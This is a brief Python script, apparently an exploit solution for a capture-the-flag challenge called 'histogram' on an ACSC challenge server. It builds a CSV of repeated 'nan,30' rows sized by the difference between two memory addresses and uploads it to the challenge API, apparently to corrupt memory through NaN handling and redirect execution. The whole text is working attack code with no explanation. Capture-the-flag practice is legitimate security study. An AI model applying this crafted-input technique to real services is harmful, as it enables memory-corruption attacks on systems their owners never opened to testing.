off = 0x401268 - 0x401060

f = open("ex.csv", "wt")

for i in range(off):
    f.write("nan,30\n")

f.close()

import requests

r = requests.post("https://histogram.chal.acsc.asia/api/histogram", files={'csv': open('ex.csv', 'rb')})

print(r.text)

